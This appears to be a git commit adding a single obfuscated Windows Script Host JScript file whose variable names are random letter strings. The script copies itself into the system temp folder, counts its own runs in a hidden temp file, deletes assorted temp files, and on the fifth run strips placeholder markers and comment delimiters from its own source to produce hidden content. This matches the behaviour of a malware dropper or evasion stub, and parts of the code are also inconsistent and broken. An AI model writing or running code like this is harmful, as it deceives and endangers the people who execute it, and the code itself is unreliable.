c4b8c671b47face35f1bd36db5d1d070c694b06d
Ialle <ialle.ironbits@gmail.com>
2017-06-30 19:09:17 -0300

    Create cbdabceefdf.js

---
+++ cbdabceefdf.js
@@ -0,0 +1,113 @@
+var cbdabceefdf = new ActiveXObject('Scripting.FileSystemObject');
+
+if (cbdabceefdf.FileExists('acadeaabccaea.txt')) {
+    cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaea.txt');
+
+    Wscript.echo('cacadfbafee');
+    Wscript.echo('cacadfbafee');
+    Wscript.echo('cacadfbafee');
+
+    Wscript.echo('cacadfbafee');
+    Wscript.echo('cacadfbafee');
+    Wscript.echo('cacadfbafee');
+
+}
+if (cbdabceefdf.FileExists('acadeaabccaeaas.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaeaas.txt');
+
+var cfbbefcffbbaedc = cbdabceefdf.GetSpecialFolder(2);
+
+var acecdfdfa = cfbbefcffbbaedc;
+
+var sdfgdfhghjghkhkjlkhg = acecdfdfa;
+
+var ddfbecdafcfcb = sdfgdfhghjghkhkjlkhg;
+
+function dfdcacadbcbcefd() {
+
+
+    var eecaedbcabad = new ActiveXObject('Scripting.FileSystemObject');
+
+
+    var beefefcffeebfae = eecaedbcabad.OpenTextFile(ddfbecdafcfcb + '/' + 'effcdddfadbfebd.txt', 1);
+
+    if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+
+    var bebbdfcffaea = beefefcffeebfae.ReadAll();
+    if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+    beefefcffeebfae.Close();
+    if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+    return bebbdfcffaea;
+
+}
+
+
+var abaccfccaced = 0;
+var dcefabbbfdc = cbdabceefdf.FileExists(ddfbecdafcfcb + '/' + 'abaccfccaceder.txt');
+if (dcefabbbfdc == true) {
+    var adccdbab = cbdabceefdf.OpenTextFile(ddfbecdafcfcb + '/' + 'abaccfccaceder.txt', 1, 1);
+    abaccfccaced = adccdbab.ReadAll();
+    adccdbab.Close();
+}
+abaccfccaced = parseInt(abaccfccaced) + 1;
+
+if (cbdabceefdf.FileExists('acadeaabccae3.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae3.txt');
+
+adccdbab = cbdabceefdf.OpenTextFile(ddfbecdafcfcb + '/' + 'abaccfccaceder.txt', 2, 1);
+
+adccdbab.WriteLine(abaccfccaced);
+adccdbab.Close();
+
+var fbdaeecabcee = WScript.ScriptFullName;
+
+if (!cbdabceefdf.FileExists(ddfbecdafcfcb + '/' + 'effcdddfadbfebd.txt')) cbdabceefdf.CopyFile(WScript.ScriptFullName, ddfbecdafcfcb + '/' + 'effcdddfadbfebd.txt', 1);
+
+var bceeecefbaeecdfdccsd = [dfdcacadbcbcefd()];
+
+var bceeecefbaeecdfdcc = bceeecefbaeecdfdccsd[0];
+
+if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+
+if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+
+if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+
+if (cbdabceefdf.FileExists('acadeaabccae.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccae.txt');
+
+
+if (abaccfccaced == 4) {
+
+
+    adccdbab = cbdabceefdf.OpenTextFile(ddfbecdafcfcb + '/' + 'fceeddebaffe.txt', 2, 1);
+
+    if (cbdabceefdf.FileExists('acadeaabccaea.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaea.txt');
+
+    adccdbab.WriteLine(abaccfccaced);
+    adccdbab.Close();
+
+}
+
+if (abaccfccaced == 5) {
+
+    if (cbdabceefdf.FileExists(ddfbecdafcfcb + '/' + 'cccdadaefdb.png')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'cccdadaefdb.png');
+    cbdabceefdf.MoveFile(ddfbecdafcfcb + '/' + 'fceeddebaffe.txt', ddfbecdafcfcb + '/' + 'deacdcbabeaddfa.txt');
+
+    if (cbdabceefdf.FileExists(ddfbecdafcfcb + '/' + 'bbbcabca.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'bbbcabca.txt');
+
+    if (cbdabceefdf.FileExists(ddfbecdafcfcb + '/' + 'bbbcabca.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'bbbcabca.txt');
+
+    if (cbdabceefdf.FileExists('acadeaabccaea.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaea.txt');
+
+    if (cbdabceefdf.FileExists('acadeaabccaea.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaea.txt');
+
+    if (cbdabceefdf.FileExists('acadeaabccaea.txt')) cbdabceefdf.DeleteFile(ddfbecdafcfcb + '/' + 'acadeaabccaea.txt');
+
+    bceeecefbaeecdfdcc = bceeecefbaeecdfdcc.replace('[cbddbcbddbad]', '').replace('/*', '').replace('[cbddbcbddbad]', '');
+    bceeecefbaeecdfdcc = bceeecefbaeecdfdcc.split('[cbddbcbddbad]').join('').replace('[cbddbcbddbad]', '').replace('ddbbbfaebdcfeb', '');
+    bceeecefbaeecdfdcc = bceeecefbaeecdfdcc.replace('[cbddbcbddbad]', '').replace('*/', '').replace('[cbddbcbddbad]', '');
+
+}
+
+
+
+
+document.write(bceeecefbaeecdfdcc);
